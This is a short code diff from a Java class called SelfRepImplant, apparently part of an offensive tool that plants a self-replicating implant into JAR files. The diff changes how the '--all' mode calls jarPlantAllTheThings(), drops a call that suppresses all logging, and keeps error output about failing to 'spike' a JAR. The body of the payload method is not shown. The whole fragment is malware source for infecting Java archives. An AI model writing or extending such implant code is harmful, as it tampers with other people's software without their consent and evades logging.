@@ -151,7 +151,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         if (args[0].equals("--all")) {
             // Run the implant right here, right now.
-            init();
+            SelfRepImplant initial = new SelfRepImplant();
+            initial.jarPlantAllTheThings();
         } else {
             // Just spike a specific JAR.
             Path targetJar = Path.of(args[0]);
@@ -174,8 +175,6 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 System.out.println("[!] Failed to spike JAR '" + targetJar + "'.");
             }
         }
-        disableAllLogging();
-        SelfRepImplant.create().jarPlantAllTheThings();
     }
 
     public void payload() {
